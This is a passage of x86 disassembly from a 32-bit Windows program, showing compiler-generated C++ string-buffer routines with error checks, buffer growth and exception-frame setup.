  401604:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40160b:	59                   	pop    %ecx
  40160c:	8b e5                	mov    %ebp,%esp
  40160e:	5d                   	pop    %ebp
  40160f:	c2 08 00             	ret    $0x8
  401612:	cc                   	int3
  401613:	cc                   	int3
  401614:	cc                   	int3
  401615:	cc                   	int3
  401616:	cc                   	int3
  401617:	cc                   	int3
  401618:	cc                   	int3
  401619:	cc                   	int3
  40161a:	cc                   	int3
  40161b:	cc                   	int3
  40161c:	cc                   	int3
  40161d:	cc                   	int3
  40161e:	cc                   	int3
  40161f:	cc                   	int3
  401620:	55                   	push   %ebp
  401621:	8b ec                	mov    %esp,%ebp
  401623:	51                   	push   %ecx
  401624:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401627:	8b 45 08             	mov    0x8(%ebp),%eax
  40162a:	50                   	push   %eax
  40162b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40162e:	e8 ad 02 00 00       	call   0x4018e0
  401633:	8b e5                	mov    %ebp,%esp
  401635:	5d                   	pop    %ebp
  401636:	c2 04 00             	ret    $0x4
  401639:	cc                   	int3
  40163a:	cc                   	int3
  40163b:	cc                   	int3
  40163c:	cc                   	int3
  40163d:	cc                   	int3
  40163e:	cc                   	int3
  40163f:	cc                   	int3
  401640:	55                   	push   %ebp
  401641:	8b ec                	mov    %esp,%ebp
  401643:	83 ec 08             	sub    $0x8,%esp
  401646:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401649:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40164d:	75 23                	jne    0x401672
  40164f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401652:	e8 69 02 00 00       	call   0x4018c0
  401657:	8b 40 08             	mov    0x8(%eax),%eax
  40165a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40165d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401660:	51                   	push   %ecx
  401661:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401664:	8b 02                	mov    (%edx),%eax
  401666:	50                   	push   %eax
  401667:	e8 34 02 00 00       	call   0x4018a0
  40166c:	83 c4 08             	add    $0x8,%esp
  40166f:	89 45 08             	mov    %eax,0x8(%ebp)
  401672:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401675:	51                   	push   %ecx
  401676:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401679:	e8 b2 02 00 00       	call   0x401930
  40167e:	8b e5                	mov    %ebp,%esp
  401680:	5d                   	pop    %ebp
  401681:	c2 04 00             	ret    $0x4
  401684:	cc                   	int3
  401685:	cc                   	int3
  401686:	cc                   	int3
  401687:	cc                   	int3
  401688:	cc                   	int3
  401689:	cc                   	int3
  40168a:	cc                   	int3
  40168b:	cc                   	int3
  40168c:	cc                   	int3
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	55                   	push   %ebp
  401691:	8b ec                	mov    %esp,%ebp
  401693:	6a ff                	push   $0xffffffff
  401695:	68 78 38 40 00       	push   $0x403878
  40169a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016a0:	50                   	push   %eax
  4016a1:	51                   	push   %ecx
  4016a2:	a1 18 50 40 00       	mov    0x405018,%eax
  4016a7:	33 c5                	xor    %ebp,%eax
  4016a9:	50                   	push   %eax
  4016aa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4016ad:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4016b3:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4016b6:	8b 45 08             	mov    0x8(%ebp),%eax
  4016b9:	50                   	push   %eax
  4016ba:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4016bd:	e8 2e 03 00 00       	call   0x4019f0
  4016c2:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4016c9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4016d0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4016d3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4016d6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4016dd:	59                   	pop    %ecx
  4016de:	8b e5                	mov    %ebp,%esp
  4016e0:	5d                   	pop    %ebp
  4016e1:	c2 04 00             	ret    $0x4
  4016e4:	cc                   	int3
  4016e5:	cc                   	int3
  4016e6:	cc                   	int3
  4016e7:	cc                   	int3
  4016e8:	cc                   	int3
  4016e9:	cc                   	int3
  4016ea:	cc                   	int3
  4016eb:	cc                   	int3
  4016ec:	cc                   	int3
  4016ed:	cc                   	int3
  4016ee:	cc                   	int3
  4016ef:	cc                   	int3
  4016f0:	55                   	push   %ebp
  4016f1:	8b ec                	mov    %esp,%ebp
  4016f3:	6a ff                	push   $0xffffffff
  4016f5:	68 78 38 40 00       	push   $0x403878
  4016fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401700:	50                   	push   %eax
  401701:	51                   	push   %ecx
  401702:	a1 18 50 40 00       	mov    0x405018,%eax
  401707:	33 c5                	xor    %ebp,%eax
  401709:	50                   	push   %eax
  40170a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40170d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401713:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401716:	8b 45 10             	mov    0x10(%ebp),%eax
  401719:	50                   	push   %eax
  40171a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40171d:	51                   	push   %ecx
  40171e:	8b 55 08             	mov    0x8(%ebp),%edx
  401721:	52                   	push   %edx
  401722:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401725:	e8 06 03 00 00       	call   0x401a30
  40172a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401731:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401738:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40173b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40173e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401745:	59                   	pop    %ecx
  401746:	8b e5                	mov    %ebp,%esp
  401748:	5d                   	pop    %ebp
  401749:	c2 0c 00             	ret    $0xc
  40174c:	cc                   	int3
  40174d:	cc                   	int3
  40174e:	cc                   	int3
  40174f:	cc                   	int3
  401750:	55                   	push   %ebp
  401751:	8b ec                	mov    %esp,%ebp
  401753:	51                   	push   %ecx
  401754:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401757:	8b 45 08             	mov    0x8(%ebp),%eax
  40175a:	50                   	push   %eax
  40175b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40175e:	e8 6d 03 00 00       	call   0x401ad0
  401763:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401766:	8b e5                	mov    %ebp,%esp
  401768:	5d                   	pop    %ebp
  401769:	c2 04 00             	ret    $0x4
  40176c:	cc                   	int3
  40176d:	cc                   	int3
  40176e:	cc                   	int3
  40176f:	cc                   	int3
  401770:	55                   	push   %ebp
  401771:	8b ec                	mov    %esp,%ebp
  401773:	83 ec 08             	sub    $0x8,%esp
  401776:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401779:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40177c:	e8 6f 03 00 00       	call   0x401af0
  401781:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401784:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401788:	74 05                	je     0x40178f
  40178a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40178d:	eb 15                	jmp    0x4017a4
  40178f:	e8 ec 01 00 00       	call   0x401980
  401794:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401797:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40179a:	8b 10                	mov    (%eax),%edx
  40179c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40179f:	8b 42 10             	mov    0x10(%edx),%eax
  4017a2:	ff d0                	call   *%eax
  4017a4:	8b e5                	mov    %ebp,%esp
  4017a6:	5d                   	pop    %ebp
  4017a7:	c3                   	ret
  4017a8:	cc                   	int3
  4017a9:	cc                   	int3
  4017aa:	cc                   	int3
  4017ab:	cc                   	int3
  4017ac:	cc                   	int3
  4017ad:	cc                   	int3
  4017ae:	cc                   	int3
  4017af:	cc                   	int3
  4017b0:	55                   	push   %ebp
  4017b1:	8b ec                	mov    %esp,%ebp
  4017b3:	83 ec 0c             	sub    $0xc,%esp
  4017b6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4017b9:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4017bd:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4017c1:	74 29                	je     0x4017ec
  4017c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4017c6:	c1 e8 10             	shr    $0x10,%eax
  4017c9:	85 c0                	test   %eax,%eax
  4017cb:	75 1f                	jne    0x4017ec
  4017cd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4017d0:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4017d6:	0f b7 d1             	movzwl %cx,%edx
  4017d9:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4017dc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4017df:	50                   	push   %eax
  4017e0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4017e3:	e8 c8 01 00 00       	call   0x4019b0
  4017e8:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  4017ec:	8a 45 ff             	mov    -0x1(%ebp),%al
  4017ef:	8b e5                	mov    %ebp,%esp
  4017f1:	5d                   	pop    %ebp
  4017f2:	c2 04 00             	ret    $0x4
  4017f5:	cc                   	int3
  4017f6:	cc                   	int3
  4017f7:	cc                   	int3
  4017f8:	cc                   	int3
  4017f9:	cc                   	int3
  4017fa:	cc                   	int3
  4017fb:	cc                   	int3
  4017fc:	cc                   	int3
  4017fd:	cc                   	int3
  4017fe:	cc                   	int3
  4017ff:	cc                   	int3
  401800:	55                   	push   %ebp
  401801:	8b ec                	mov    %esp,%ebp
  401803:	83 ec 0c             	sub    $0xc,%esp
  401806:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401809:	33 c0                	xor    %eax,%eax
  40180b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40180f:	0f 95 c0             	setne  %al
  401812:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401815:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401819:	75 0a                	jne    0x401825
  40181b:	68 05 40 00 80       	push   $0x80004005
  401820:	e8 0b f8 ff ff       	call   0x401030
  401825:	33 c9                	xor    %ecx,%ecx
  401827:	75 e0                	jne    0x401809
  401829:	8b 55 08             	mov    0x8(%ebp),%edx
  40182c:	8b 02                	mov    (%edx),%eax
  40182e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401831:	8b 50 0c             	mov    0xc(%eax),%edx
  401834:	ff d2                	call   *%edx
  401836:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401839:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40183c:	50                   	push   %eax
  40183d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401840:	e8 eb 02 00 00       	call   0x401b30
  401845:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401848:	8b e5                	mov    %ebp,%esp
  40184a:	5d                   	pop    %ebp
  40184b:	c2 04 00             	ret    $0x4
  40184e:	cc                   	int3
  40184f:	cc                   	int3
  401850:	55                   	push   %ebp
  401851:	8b ec                	mov    %esp,%ebp
  401853:	83 ec 08             	sub    $0x8,%esp
  401856:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401859:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40185c:	e8 5f 00 00 00       	call   0x4018c0
  401861:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401864:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401867:	e8 44 fa ff ff       	call   0x4012b0
  40186c:	8b e5                	mov    %ebp,%esp
  40186e:	5d                   	pop    %ebp
  40186f:	c3                   	ret
  401870:	55                   	push   %ebp
  401871:	8b ec                	mov    %esp,%ebp
  401873:	51                   	push   %ecx
  401874:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401877:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40187a:	e8 41 00 00 00       	call   0x4018c0
  40187f:	8b 40 04             	mov    0x4(%eax),%eax
  401882:	8b e5                	mov    %ebp,%esp
  401884:	5d                   	pop    %ebp
  401885:	c3                   	ret
  401886:	cc                   	int3
  401887:	cc                   	int3
  401888:	cc                   	int3
  401889:	cc                   	int3
  40188a:	cc                   	int3
  40188b:	cc                   	int3
  40188c:	cc                   	int3
  40188d:	cc                   	int3
  40188e:	cc                   	int3
  40188f:	cc                   	int3
  401890:	55                   	push   %ebp
  401891:	8b ec                	mov    %esp,%ebp
  401893:	51                   	push   %ecx
  401894:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401897:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40189a:	8b 00                	mov    (%eax),%eax
  40189c:	8b e5                	mov    %ebp,%esp
  40189e:	5d                   	pop    %ebp
  40189f:	c3                   	ret
  4018a0:	55                   	push   %ebp
  4018a1:	8b ec                	mov    %esp,%ebp
  4018a3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4018a7:	75 04                	jne    0x4018ad
  4018a9:	33 c0                	xor    %eax,%eax
  4018ab:	eb 11                	jmp    0x4018be
  4018ad:	8b 45 0c             	mov    0xc(%ebp),%eax
  4018b0:	50                   	push   %eax
  4018b1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4018b4:	51                   	push   %ecx
  4018b5:	ff 15 1c 41 40 00    	call   *0x40411c
  4018bb:	83 c4 08             	add    $0x8,%esp
  4018be:	5d                   	pop    %ebp
  4018bf:	c3                   	ret
  4018c0:	55                   	push   %ebp
  4018c1:	8b ec                	mov    %esp,%ebp
  4018c3:	51                   	push   %ecx
  4018c4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4018c7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4018ca:	8b 00                	mov    (%eax),%eax
  4018cc:	83 e8 10             	sub    $0x10,%eax
  4018cf:	8b e5                	mov    %ebp,%esp
  4018d1:	5d                   	pop    %ebp
  4018d2:	c3                   	ret
  4018d3:	cc                   	int3
  4018d4:	cc                   	int3
  4018d5:	cc                   	int3
  4018d6:	cc                   	int3
  4018d7:	cc                   	int3
  4018d8:	cc                   	int3
  4018d9:	cc                   	int3
  4018da:	cc                   	int3
  4018db:	cc                   	int3
  4018dc:	cc                   	int3
  4018dd:	cc                   	int3
  4018de:	cc                   	int3
  4018df:	cc                   	int3
  4018e0:	55                   	push   %ebp
  4018e1:	8b ec                	mov    %esp,%ebp
  4018e3:	83 ec 10             	sub    $0x10,%esp
  4018e6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4018e9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4018ec:	e8 cf ff ff ff       	call   0x4018c0
  4018f1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4018f4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4018f7:	b9 01 00 00 00       	mov    $0x1,%ecx
  4018fc:	2b 48 0c             	sub    0xc(%eax),%ecx
  4018ff:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401902:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401905:	8b 42 08             	mov    0x8(%edx),%eax
  401908:	2b 45 08             	sub    0x8(%ebp),%eax
  40190b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40190e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401911:	0b 4d f8             	or     -0x8(%ebp),%ecx
  401914:	7d 0c                	jge    0x401922
  401916:	8b 55 08             	mov    0x8(%ebp),%edx
  401919:	52                   	push   %edx
  40191a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40191d:	e8 2e 02 00 00       	call   0x401b50
  401922:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401925:	8b 00                	mov    (%eax),%eax
  401927:	8b e5                	mov    %ebp,%esp
  401929:	5d                   	pop    %ebp
  40192a:	c2 04 00             	ret    $0x4
  40192d:	cc                   	int3
  40192e:	cc                   	int3
  40192f:	cc                   	int3
  401930:	55                   	push   %ebp
  401931:	8b ec                	mov    %esp,%ebp
  401933:	51                   	push   %ecx
  401934:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401937:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40193b:	7c 10                	jl     0x40194d
  40193d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401940:	e8 7b ff ff ff       	call   0x4018c0
  401945:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401948:	3b 48 08             	cmp    0x8(%eax),%ecx
  40194b:	7e 0a                	jle    0x401957
  40194d:	68 57 00 07 80       	push   $0x80070057
  401952:	e8 d9 f6 ff ff       	call   0x401030
  401957:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40195a:	e8 61 ff ff ff       	call   0x4018c0
  40195f:	8b 55 08             	mov    0x8(%ebp),%edx
  401962:	89 50 04             	mov    %edx,0x4(%eax)
  401965:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401968:	8b 08                	mov    (%eax),%ecx
  40196a:	8b 55 08             	mov    0x8(%ebp),%edx
  40196d:	c6 04 11 00          	movb   $0x0,(%ecx,%edx,1)
  401971:	8b e5                	mov    %ebp,%esp
  401973:	5d                   	pop    %ebp
  401974:	c2 04 00             	ret    $0x4
  401977:	cc                   	int3
  401978:	cc                   	int3
  401979:	cc                   	int3
  40197a:	cc                   	int3
  40197b:	cc                   	int3
  40197c:	cc                   	int3
  40197d:	cc                   	int3
  40197e:	cc                   	int3
  40197f:	cc                   	int3
  401980:	55                   	push   %ebp
  401981:	8b ec                	mov    %esp,%ebp
  401983:	b8 94 50 40 00       	mov    $0x405094,%eax
  401988:	5d                   	pop    %ebp
  401989:	c3                   	ret
  40198a:	cc                   	int3
  40198b:	cc                   	int3
  40198c:	cc                   	int3
  40198d:	cc                   	int3
  40198e:	cc                   	int3
  40198f:	cc                   	int3
  401990:	55                   	push   %ebp
  401991:	8b ec                	mov    %esp,%ebp
  401993:	0f b6 45 0c          	movzbl 0xc(%ebp),%eax
  401997:	50                   	push   %eax
  401998:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40199b:	51                   	push   %ecx
  40199c:	ff 15 18 41 40 00    	call   *0x404118
  4019a2:	83 c4 08             	add    $0x8,%esp
  4019a5:	5d                   	pop    %ebp
  4019a6:	c3                   	ret
  4019a7:	cc                   	int3
  4019a8:	cc                   	int3
  4019a9:	cc                   	int3
  4019aa:	cc                   	int3
  4019ab:	cc                   	int3
  4019ac:	cc                   	int3
  4019ad:	cc                   	int3
  4019ae:	cc                   	int3
  4019af:	cc                   	int3
  4019b0:	55                   	push   %ebp
  4019b1:	8b ec                	mov    %esp,%ebp
  4019b3:	83 ec 08             	sub    $0x8,%esp
  4019b6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4019b9:	8b 45 08             	mov    0x8(%ebp),%eax
  4019bc:	50                   	push   %eax
  4019bd:	e8 fe 04 00 00       	call   0x401ec0
  4019c2:	83 c4 04             	add    $0x4,%esp
  4019c5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4019c8:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4019cc:	75 04                	jne    0x4019d2
  4019ce:	33 c0                	xor    %eax,%eax
  4019d0:	eb 10                	jmp    0x4019e2
  4019d2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019d5:	51                   	push   %ecx
  4019d6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4019d9:	52                   	push   %edx
  4019da:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4019dd:	e8 0e 02 00 00       	call   0x401bf0
  4019e2:	8b e5                	mov    %ebp,%esp
  4019e4:	5d                   	pop    %ebp
  4019e5:	c2 04 00             	ret    $0x4
  4019e8:	cc                   	int3
  4019e9:	cc                   	int3
  4019ea:	cc                   	int3
  4019eb:	cc                   	int3
  4019ec:	cc                   	int3
  4019ed:	cc                   	int3
  4019ee:	cc                   	int3
  4019ef:	cc                   	int3
  4019f0:	55                   	push   %ebp
  4019f1:	8b ec                	mov    %esp,%ebp
  4019f3:	83 ec 0c             	sub    $0xc,%esp
  4019f6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4019f9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019fc:	e8 bf fe ff ff       	call   0x4018c0
  401a01:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a04:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a07:	50                   	push   %eax
  401a08:	e8 03 04 00 00       	call   0x401e10
  401a0d:	83 c4 04             	add    $0x4,%esp
  401a10:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a13:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401a16:	51                   	push   %ecx
  401a17:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401a1a:	e8 11 01 00 00       	call   0x401b30
  401a1f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401a22:	8b e5                	mov    %ebp,%esp
  401a24:	5d                   	pop    %ebp
  401a25:	c2 04 00             	ret    $0x4
  401a28:	cc                   	int3
  401a29:	cc                   	int3
  401a2a:	cc                   	int3
  401a2b:	cc                   	int3
  401a2c:	cc                   	int3
  401a2d:	cc                   	int3
  401a2e:	cc                   	int3
  401a2f:	cc                   	int3
  401a30:	55                   	push   %ebp
  401a31:	8b ec                	mov    %esp,%ebp
  401a33:	83 ec 0c             	sub    $0xc,%esp
  401a36:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401a39:	33 c0                	xor    %eax,%eax
  401a3b:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401a3f:	0f 95 c0             	setne  %al
  401a42:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a45:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401a49:	75 0a                	jne    0x401a55
  401a4b:	68 05 40 00 80       	push   $0x80004005
  401a50:	e8 db f5 ff ff       	call   0x401030
  401a55:	33 c9                	xor    %ecx,%ecx
  401a57:	75 e0                	jne    0x401a39
  401a59:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401a5d:	75 10                	jne    0x401a6f
  401a5f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  401a63:	74 0a                	je     0x401a6f
  401a65:	68 57 00 07 80       	push   $0x80070057
  401a6a:	e8 c1 f5 ff ff       	call   0x401030
  401a6f:	6a 01                	push   $0x1
  401a71:	8b 55 0c             	mov    0xc(%ebp),%edx
  401a74:	52                   	push   %edx
  401a75:	8b 45 10             	mov    0x10(%ebp),%eax
  401a78:	8b 10                	mov    (%eax),%edx
  401a7a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401a7d:	8b 02                	mov    (%edx),%eax
  401a7f:	ff d0                	call   *%eax
  401a81:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a84:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401a88:	75 05                	jne    0x401a8f
  401a8a:	e8 41 02 00 00       	call   0x401cd0
  401a8f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401a92:	51                   	push   %ecx
  401a93:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401a96:	e8 95 00 00 00       	call   0x401b30
  401a9b:	8b 55 0c             	mov    0xc(%ebp),%edx
  401a9e:	52                   	push   %edx
  401a9f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401aa2:	e8 89 fe ff ff       	call   0x401930
  401aa7:	8b 45 0c             	mov    0xc(%ebp),%eax
  401aaa:	50                   	push   %eax
  401aab:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401aae:	51                   	push   %ecx
  401aaf:	8b 55 0c             	mov    0xc(%ebp),%edx
  401ab2:	52                   	push   %edx
  401ab3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401ab6:	8b 08                	mov    (%eax),%ecx
  401ab8:	51                   	push   %ecx
  401ab9:	e8 f2 01 00 00       	call   0x401cb0
  401abe:	83 c4 10             	add    $0x10,%esp
  401ac1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401ac4:	8b e5                	mov    %ebp,%esp
  401ac6:	5d                   	pop    %ebp
  401ac7:	c2 0c 00             	ret    $0xc
  401aca:	cc                   	int3
  401acb:	cc                   	int3
  401acc:	cc                   	int3
  401acd:	cc                   	int3
  401ace:	cc                   	int3
  401acf:	cc                   	int3
  401ad0:	55                   	push   %ebp
  401ad1:	8b ec                	mov    %esp,%ebp
  401ad3:	51                   	push   %ecx
  401ad4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ad7:	8b 45 08             	mov    0x8(%ebp),%eax
  401ada:	50                   	push   %eax
  401adb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ade:	e8 9d 01 00 00       	call   0x401c80
  401ae3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ae6:	8b e5                	mov    %ebp,%esp
  401ae8:	5d                   	pop    %ebp
  401ae9:	c2 04 00             	ret    $0x4
  401aec:	cc                   	int3
  401aed:	cc                   	int3
  401aee:	cc                   	int3
  401aef:	cc                   	int3
  401af0:	55                   	push   %ebp
  401af1:	8b ec                	mov    %esp,%ebp
  401af3:	83 ec 0c             	sub    $0xc,%esp
  401af6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401af9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401afc:	e8 bf fd ff ff       	call   0x4018c0
  401b01:	8b 00                	mov    (%eax),%eax
  401b03:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b06:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401b0a:	74 12                	je     0x401b1e
  401b0c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b0f:	8b 11                	mov    (%ecx),%edx
  401b11:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b14:	8b 42 10             	mov    0x10(%edx),%eax
  401b17:	ff d0                	call   *%eax
  401b19:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401b1c:	eb 07                	jmp    0x401b25
  401b1e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401b25:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b28:	8b e5                	mov    %ebp,%esp
  401b2a:	5d                   	pop    %ebp
  401b2b:	c3                   	ret
  401b2c:	cc                   	int3
  401b2d:	cc                   	int3
  401b2e:	cc                   	int3
  401b2f:	cc                   	int3
  401b30:	55                   	push   %ebp
  401b31:	8b ec                	mov    %esp,%ebp
  401b33:	51                   	push   %ecx
  401b34:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b37:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b3a:	e8 f1 f6 ff ff       	call   0x401230
  401b3f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b42:	89 01                	mov    %eax,(%ecx)
  401b44:	8b e5                	mov    %ebp,%esp
  401b46:	5d                   	pop    %ebp
  401b47:	c2 04 00             	ret    $0x4
  401b4a:	cc                   	int3
  401b4b:	cc                   	int3
  401b4c:	cc                   	int3
  401b4d:	cc                   	int3
  401b4e:	cc                   	int3
  401b4f:	cc                   	int3
  401b50:	55                   	push   %ebp
  401b51:	8b ec                	mov    %esp,%ebp
  401b53:	83 ec 0c             	sub    $0xc,%esp
  401b56:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401b59:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401b5c:	e8 5f fd ff ff       	call   0x4018c0
  401b61:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b64:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b67:	8b 48 04             	mov    0x4(%eax),%ecx
  401b6a:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  401b6d:	7e 09                	jle    0x401b78
  401b6f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401b72:	8b 42 04             	mov    0x4(%edx),%eax
  401b75:	89 45 08             	mov    %eax,0x8(%ebp)
  401b78:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b7b:	e8 10 f7 ff ff       	call   0x401290
  401b80:	0f b6 c8             	movzbl %al,%ecx
  401b83:	85 c9                	test   %ecx,%ecx
  401b85:	74 0e                	je     0x401b95
  401b87:	8b 55 08             	mov    0x8(%ebp),%edx
  401b8a:	52                   	push   %edx
  401b8b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401b8e:	e8 4d 01 00 00       	call   0x401ce0
  401b93:	eb 4d                	jmp    0x401be2
  401b95:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b98:	8b 48 08             	mov    0x8(%eax),%ecx
  401b9b:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  401b9e:	7d 42                	jge    0x401be2
  401ba0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401ba3:	8b 42 08             	mov    0x8(%edx),%eax
  401ba6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ba9:	81 7d f8 00 04 00 00 	cmpl   $0x400,-0x8(%ebp)
  401bb0:	7e 0e                	jle    0x401bc0
  401bb2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401bb5:	81 c1 00 04 00 00    	add    $0x400,%ecx
  401bbb:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401bbe:	eb 08                	jmp    0x401bc8
  401bc0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401bc3:	d1 e2                	shl    $1,%edx
